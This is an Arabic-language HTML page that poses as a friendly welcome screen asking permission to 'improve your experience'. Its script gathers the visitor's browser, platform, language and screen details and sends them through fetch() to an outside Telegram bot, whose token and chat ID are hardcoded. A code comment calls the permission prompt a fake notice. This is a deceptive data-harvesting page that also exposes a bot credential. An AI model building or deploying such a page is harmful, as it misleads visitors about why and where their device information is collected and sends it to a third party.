<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مرحباً بك</title>
    <style>
        body {
            background-color: #f0f0f0;
            color: #333;
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        .container {
            padding: 20px;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
            display: inline-block;
        }
        h1 {
            color: #4CAF50;
        }
        button {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>مرحباً بك في موقعنا!</h1>
        <p>يرجى السماح للوصول إلى معلومات الجهاز لتحسين تجربتك.</p>
        <button onclick="requestPermission()">السماح بالوصول</button>
    </div>

    <script>
        function requestPermission() {
            // إشعار وهمي للحصول على إذن المستخدم
            if (confirm("هل تسمح بالوصول إلى معلومات جهازك؟")) {
                collectDeviceInfo();
            } else {
                alert("لم يتم الحصول على الإذن.");
            }
        }

        function collectDeviceInfo() {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height
            };

            // عرض رسالة تأكيد
            alert("تم جمع المعلومات بنجاح!");

            // إرسال المعلومات إلى البوت
            sendToTelegram(deviceInfo);
        }

        function sendToTelegram(info) {
            const botToken = "6604522716:AAFDrWCrOLf8k5lRDp5TyI1VbL9kcMPuwR4";
            const chatId = "1854384004";
            const message = `معلومات الجهاز:\nنظام التشغيل: ${info.platform}\nالمتصفح: ${info.userAgent}\nلغة المتصفح: ${info.language}\nدقة الشاشة: ${info.screenWidth}x${info.screenHeight}`;

            // طلب HTTP لإرسال المعلومات إلى Telegram Bot API
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        alert("تم إرسال المعلومات بنجاح إلى البوت.");
                    } else {
                        alert("حدث خطأ أثناء إرسال المعلومات.");
                    }
                })
                .catch(error => {
                    console.error("Error:", error);
                });
        }
    </script>
</body>
</html>
